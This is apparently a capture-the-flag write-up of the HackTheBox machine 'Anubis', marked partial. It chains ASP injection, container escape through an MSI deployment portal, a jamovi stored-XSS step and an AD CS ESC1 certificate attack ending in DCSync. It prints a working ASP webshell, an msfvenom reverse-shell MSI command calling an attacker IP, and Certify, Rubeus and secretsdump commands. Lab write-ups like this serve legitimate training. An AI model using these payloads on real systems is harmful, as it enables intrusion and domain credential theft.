---
title: "Anubis"
date: 2022-01-08
type: docs
tags:
  - htb
  - windows
  - insane
  - active-directory
  - asp-injection
  - container-breakout
  - chisel
  - msi
  - jamovi
  - stored-xss
  - adcs
  - esc1
  - certify
  - rubeus
  - dcsync
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows (AD, `windcorp.htb`, DC `earth.windcorp.htb`), **Difficulty:** Insane, **Released:** 2022-01-08, **IP:** `10.10.11.102`

</div>

<div class="callout callout-warning">

**Partial**

My notes cover the ASP injection, the container shell, mimikatz, and the pivot to the software portal. The MSI, jamovi, and AD CS steps are reconstructed from published writeups (Hacking Articles, m19o) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. IIS site `www.windcorp.htb`. The **contact form** stores submissions into `preview.asp`, which renders them. **ASP/JScript injection** in the message body gives a webshell, running in a **Windows container** (`WEBSERVER01`).
2. mimikatz LSA secrets leaks the container autologon (`DefaultPassword = ContainerPw`) and the host hosts file points at **`softwareportal.windcorp.htb`** (172.19.48.1). Tunnel with chisel.
3. The "Windcorp Software Portal" **installs MSI packages on hosts as SYSTEM**. Host a malicious MSI (`msfvenom -f msi`), point the portal at it, target `EARTH`. SYSTEM on the container host / DC member.
4. On `EARTH`, the **jamovi** statistics app runs with a stored **XSS** in computed columns. A privileged user opens a crafted `.omv`, executing your JS in their session, which yields a shell as **`diego`** (or `jamie`).
5. `diego` is in a group that can enroll in a vulnerable certificate template (**ESC1**). `Certify.exe request ... /altname:administrator` gets an Administrator cert. `Rubeus asktgt /certificate` then **DCSync**. Domain Admin.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| container LSA secret | `ContainerPw` (autologon) |
| `user.txt` | on `diego` / the DC user |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

Anubis is a full Insane: five stages, each a different discipline. **ASP injection** into a preview page for the foothold, **Windows container breakout** via a portal that installs MSIs as SYSTEM, **stored XSS in a desktop stats app (jamovi)** to phish a user, and finally **AD CS ESC1** for Domain Admin. It is one of the better boxes for seeing how a modern Windows environment actually falls: not a single CVE, but a chain of "this service trusts that input" all the way to the CA. The transferable pieces are the container LSA-secrets trick, the "software deployment portal = SYSTEM" pattern, and `Certify` + `Rubeus` for the certificate to TGT to DCSync flow.

Related ASP injection: unique here. Related MSI/software-deploy privesc: [SET](/writeups/tryhackme/windows/medium/set/) (THM, similar portal). Related AD CS: [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/). Related DCSync finish: [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [Reset](/writeups/tryhackme/windows/hard/reset/).

---

## Full Walkthrough

### Recon

```console
PORT    STATE SERVICE
135/tcp open  msrpc
443/tcp open  ssl/http   (cert CN = www.windcorp.htb)
445/tcp open  microsoft-ds
593/tcp open  ncacn_http
```

`enum4linux-ng` over an unauthenticated SMB session: domain `WINDCORP`, computer `EARTH`, FQDN `earth.windcorp.htb`. `dirsearch` on `https://www.windcorp.htb/` finds `contact.html`, `preview.asp`, `save.asp`.

### Foothold, ASP injection in the contact form

The contact form POSTs to `save.asp`, which writes the fields into `preview.asp` and redirects there, so `preview.asp` renders your input as part of an ASP page.

<div class="callout callout-note">

**Classic ASP / JScript webshell**

Because the message body ends up inside a `<% %>` context (or is written to a `.asp` that is then executed), a payload like this becomes a webshell:
```asp
<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("uwu")
If (szCMD <> "") Then
  szTempFile = "C:\" & oFileSys.GetTempName()
  Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
  Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)
End If %>
<form><input name="uwu"><input type="submit"></form>
<pre><% If IsObject(oFile) Then Response.Write Server.HTMLEncode(oFile.ReadAll) : oFile.Close : oFileSys.DeleteFile(szTempFile,True) End If %>
```

</div>

we put that in the message box, then had a webshell. From it, a base64 PowerShell reverse-shell one-liner gave a proper shell as the IIS user on `WEBSERVER01`.

### Container breakout, mimikatz then the portal

`hostname` is `WEBSERVER01`, `WORKGROUP`, not the domain, this is a **container**. mimikatz LSA secrets:

```
Secret  : DefaultPassword
cur/text: ContainerPw
```

The container's hosts file / an internal DNS server at `172.19.48.1` resolves **`softwareportal.windcorp.htb`**. Tunnel it (meterpreter `socks_proxy` + `route add 172.19.48.0/24`, or chisel):

```console
proxychains whatweb http://softwareportal.windcorp.htb
# [200] "Windcorp Software-Portal", ASP.NET, Microsoft-IIS/10.0, IP 172.19.48.1
```

<div class="callout callout-note">

**Beyond the recorded notes, MSI to SYSTEM on EARTH**

The portal lets you pick a package and a target host and clicks "install". It deploys the MSI to the chosen host **as SYSTEM** via the software-deployment service. Host your own:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9002 -f msi -o pkg.msi
python3 -m http.server 80
```
In the portal, add a package pointing at `http://<container-ip>/pkg.msi` (serve it from the container so `EARTH` can reach it, or from a host on the internal net), target `EARTH`, install. SYSTEM shell on `EARTH`.

</div>

### diego via jamovi stored XSS

<div class="callout callout-note">

**jamovi computed-column XSS (reconstructed)**

`EARTH` runs **jamovi** (an R-based stats GUI) exposed internally. jamovi ≤ 1.6.x renders a computed column's formula/label without sanitising, so an `.omv` file (jamovi's zip format) with a column label of `<img src=x onerror=...>` executes JS in the jamovi Electron context when a user opens it. Drop a crafted `.omv` where an analyst (`diego`) will open it, or trigger the file via the portal. The payload runs `require('child_process').exec(...)` for a shell as `diego`. `user.txt` is `diego`'s.

</div>

### Domain Admin, AD CS ESC1

```powershell
.\Certify.exe find /vulnerable
```

<div class="callout callout-note">

**ESC1 to DCSync**

`diego` (member of a group with enrollment rights on a template that has `ENROLLEE_SUPPLIES_SUBJECT` and the Client Authentication EKU) can request a certificate **for any principal**:
```powershell
.\Certify.exe request /ca:earth.windcorp.htb\windcorp-EARTH-CA /template:<Template> /altname:administrator
# convert the .pem to .pfx with openssl
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap
```
With the Administrator TGT (or NT hash from `/getcredentials`):
```bash
secretsdump.py -just-dc windcorp/administrator@earth.windcorp.htb -hashes :<hash>
psexec.py windcorp/administrator@earth.windcorp.htb -hashes :<hash>
```

</div>

Read `root.txt`.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `diego`'s desktop |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Never render user input as code.** Writing form fields into a `.asp` is a webshell.
- **Containers are not a security boundary from the domain.** LSA secrets, the hosts file, and network position all leak upward. Do not domain-join or autologon a public-facing container.
- **A software-deployment portal is SYSTEM on every managed host.** Authenticate it, sign packages, and restrict who can add them.
- **Patch and sandbox desktop apps like jamovi**, and do not open untrusted data files with them.
- **Lock down AD CS.** ESC1 (enrollee-supplied subject + auth EKU + broad enrollment) is Domain Admin. Run `Certify find /vulnerable` on your own CA.

---

## Related Writeups

- **Software-deploy / MSI as SYSTEM:** [SET](/writeups/tryhackme/windows/medium/set/)
- **AD CS ESC1 / ESC4:** [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/)
- **Certificate to TGT to DCSync:** [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [Reset](/writeups/tryhackme/windows/hard/reset/)
- **Container to host escape:** [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)

## References

- HTB Anubis (Hacking Articles) <https://www.hackingarticles.in/anubis-hackthebox-walkthrough/>
- Certify + Certified Pre-Owned <https://github.com/GhostPack/Certify>
- Rubeus <https://github.com/GhostPack/Rubeus>
- jamovi security notes <https://www.jamovi.org/>
